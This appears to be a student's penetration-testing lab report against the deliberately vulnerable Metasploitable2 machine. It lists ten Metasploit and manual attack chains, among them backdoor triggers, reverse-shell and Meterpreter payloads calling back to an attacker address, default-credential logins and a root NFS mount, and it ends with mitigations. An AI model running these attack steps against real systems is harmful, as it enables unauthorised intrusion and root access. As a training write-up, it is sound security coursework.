# Metasploitable2 Exploitation Report

**Name:** Louisa Yankah
**Index Number:** 7364423
**Date:** September 21, 2026
**Target IP:** 10.10.10.5
**Attacker OS / Tools:** Kali Linux 2025.2, Metasploit Framework 6.4.64-dev, nmap

---

## Reconnaissance Summary

nmap -sV -sC 10.10.10.5

Open ports found: FTP (21, vsftpd 2.3.4), SSH (22), Telnet (23), SMTP (25),
DNS (53), HTTP (80), RPC (111), NetBIOS/SMB (139, 445), distccd (3632),
MySQL (3306), PostgreSQL (5432), VNC (5900), X11 (6000), IRC/UnrealIRCd
(6667), Apache Jserv/AJP13 (8009), Apache Tomcat (8180), NFS (2049).
Full output saved in nmap_scan.txt in repo root.

---

## Exploit 1: UnrealIRCd 3.2.8.1 Backdoor

- **Service/Port:** IRC / 6667
- **Vulnerability:** Backdoored UnrealIRCd 3.2.8.1 source
- **Tool Used:** Metasploit - exploit/unix/irc/unreal_ircd_3281_backdoor
- **Why This Tool:** nmap fingerprinted the exact vulnerable version.
  This module sends the exact backdoor trigger string.
- **Steps:** use exploit/unix/irc/unreal_ircd_3281_backdoor -> set RHOSTS
  10.10.10.5 -> set payload cmd/unix/reverse -> set LHOST 10.10.10.4 -> exploit
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery,
  Exploitation, Installation, C2, Actions on Objectives
- **Outcome:** Full root shell (uid=0)

---

## Exploit 2: Samba usermap_script Command Injection

- **Service/Port:** SMB / 139
- **Vulnerability:** Samba 3.0.20 username map script command injection
- **Tool Used:** Metasploit - exploit/multi/samba/usermap_script
- **Why This Tool:** nmap identified Samba 3.0.20-Debian. Module injects
  shell metacharacters via the username map script config option.
- **Steps:** use exploit/multi/samba/usermap_script -> set RHOSTS
  10.10.10.5 -> exploit
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery,
  Exploitation, Installation, C2
- **Outcome:** Root shell (uid=0)

---

## Exploit 3: distcc Remote Code Execution

- **Service/Port:** distccd / 3632
- **Vulnerability:** distcc daemon accepts unauthenticated compile jobs
- **Tool Used:** Metasploit - exploit/unix/misc/distcc_exec
- **Why This Tool:** distccd has no authentication by design flaw. Module
  submits a malicious job executing shell commands instead of gcc.
- **Steps:** use exploit/unix/misc/distcc_exec -> set RHOSTS 10.10.10.5 ->
  set payload cmd/unix/reverse -> set LHOST 10.10.10.4 -> exploit
- **Evidence:** evidence/exploit3.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery,
  Exploitation, Installation, C2
- **Outcome:** Shell as uid=1(daemon), not root - shows reduced privileges

---

## Exploit 4: VNC Weak Authentication

- **Service/Port:** VNC / 5900
- **Vulnerability:** Weak default VNC password
- **Tool Used:** Metasploit - auxiliary/scanner/vnc/vnc_login
- **Why This Tool:** nmap identified VNC Authentication with no hardening.
  This is a credential-check module, not an RCE.
- **Steps:** use auxiliary/scanner/vnc/vnc_login -> set RHOSTS 10.10.10.5
  -> set PASSWORD password -> run
- **Evidence:** evidence/exploit4.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation
- **Outcome:** Valid VNC credentials confirmed (password: password)

---

## Exploit 5: PostgreSQL Default Credentials

- **Service/Port:** PostgreSQL / 5432
- **Vulnerability:** Default credentials postgres:postgres
- **Tool Used:** Metasploit - auxiliary/scanner/postgres/postgres_login
- **Why This Tool:** nmap fingerprinted PostgreSQL 8.3. Module tests
  default credential pairs directly against the database.
- **Steps:** use auxiliary/scanner/postgres/postgres_login -> set RHOSTS
  10.10.10.5 -> set USERNAME postgres -> set PASSWORD postgres -> run
- **Evidence:** evidence/exploit5.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation
- **Outcome:** Valid database credentials confirmed

---

## Exploit 6: Apache Tomcat Manager WAR Deployment

- **Service/Port:** Apache Tomcat / 8180
- **Vulnerability:** Default Tomcat manager credentials tomcat:tomcat
- **Tool Used:** Metasploit - exploit/multi/http/tomcat_mgr_deploy
- **Why This Tool:** nmap identified Tomcat/Coyote JSP engine 1.1. Module
  deploys a malicious WAR file with embedded JSP payload.
- **Steps:** use exploit/multi/http/tomcat_mgr_deploy -> set RHOSTS
  10.10.10.5 -> set RPORT 8180 -> set HttpUsername/HttpPassword tomcat ->
  set payload java/meterpreter/reverse_tcp -> set LHOST 10.10.10.4 -> exploit
- **Evidence:** evidence/exploit6.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery,
  Exploitation, Installation, C2, Actions on Objectives
- **Outcome:** Meterpreter session as tomcat55 user

---

## Exploit 7: Ingreslock Backdoor Shell (Port 1524)

- **Service/Port:** backdoor / 1524
- **Vulnerability:** Pre-existing root shell backdoor bound to port 1524
- **Tool Used:** netcat (manual/CLI, not msfconsole)
- **Why This Tool:** Not a software vulnerability - an already-open root
  shell listener. netcat is the simplest correct tool to connect.
- **Steps:** nc 10.10.10.5 1524
- **Evidence:** evidence/exploit7.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Installation/C2,
  Actions on Objectives
- **Outcome:** Immediate root shell, no authentication required

---

## Exploit 8: Java RMI Server Insecure Default Configuration

- **Service/Port:** Java RMI Registry / 1099
- **Vulnerability:** RMI registry accepts remote class loading with no auth
- **Tool Used:** Metasploit - exploit/multi/misc/java_rmi_server
- **Why This Tool:** RMI on 1099 open with no authentication. Module
  serves a malicious payload JAR the target loads and executes.
- **Steps:** use exploit/multi/misc/java_rmi_server -> set RHOSTS
  10.10.10.5 -> set RPORT 1099 -> set target 0 -> set payload
  java/meterpreter/reverse_tcp -> set LHOST 10.10.10.4 -> exploit
- **Evidence:** evidence/exploit8.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery,
  Exploitation, Installation, C2
- **Outcome:** Meterpreter session as root

---

## Exploit 9: NFS World-Exported Root Filesystem

- **Service/Port:** NFS / rpcbind (111), nfsd (2049)
- **Vulnerability:** Entire root filesystem exported to any host
- **Tool Used:** showmount + mount (manual/CLI, no Metasploit module)
- **Why This Tool:** Configuration flaw, not a software bug. showmount
  enumerates exports; mount accesses the share directly.
- **Steps:** showmount -e 10.10.10.5 -> sudo mkdir -p /tmp/nfs_mount ->
  sudo mount -t nfs -o nolock 10.10.10.5:/ /tmp/nfs_mount -> ls -la
- **Evidence:** evidence/exploit9.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation,
  Actions on Objectives
- **Outcome:** Full unauthenticated read access to target root filesystem

---

## Exploit 10: vsftpd 2.3.4 Backdoor

- **Service/Port:** FTP / 21
- **Vulnerability:** Backdoored vsftpd 2.3.4 source
- **Tool Used:** Metasploit - exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** nmap fingerprinted vsftpd 2.3.4 exactly. Module sends
  the trigger string as a username, opening a backdoor shell on port 6200.
- **Steps:** use exploit/unix/ftp/vsftpd_234_backdoor -> set RHOSTS
  10.10.10.5 -> exploit
- **Evidence:** evidence/exploit10.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery,
  Exploitation, Installation, C2, Actions on Objectives
- **Outcome:** Immediate root shell (uid=0)

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. UnrealIRCd Backdoor | Y | Y | Y | Y | Y | Y | Y |
| 2. Samba usermap_script | Y | Y | Y | Y | Y | Y | |
| 3. distcc RCE | Y | Y | Y | Y | Y | Y | |
| 4. VNC Weak Auth | Y | | Y | Y | | | |
| 5. PostgreSQL Default Creds | Y | | Y | Y | | | |
| 6. Tomcat WAR Deploy | Y | Y | Y | Y | Y | Y | Y |
| 7. Ingreslock Backdoor | Y | | Y | | Y | Y | Y |
| 8. Java RMI Server | Y | Y | Y | Y | Y | Y | |
| 9. NFS World Export | Y | | Y | Y | | | Y |
| 10. vsftpd Backdoor | Y | Y | Y | Y | Y | Y | Y |

---

## Lessons Learned / Mitigations

- **UnrealIRCd/vsftpd backdoors:** Always verify checksums/signatures of
  downloaded software; use official repositories only.
- **Default credentials (PostgreSQL, Tomcat, VNC):** Change all default
  passwords immediately after installation; enforce strong password policy.
- **NFS misconfiguration:** Never export filesystems with wildcard (*)
  access; restrict exports to specific trusted hosts/subnets.
- **Samba/distcc:** Disable unused services; restrict distccd to trusted
  networks only or disable entirely in production.
- **General:** Keep all software patched and updated; disable unnecessary
  services; implement network segmentation and firewall rules.

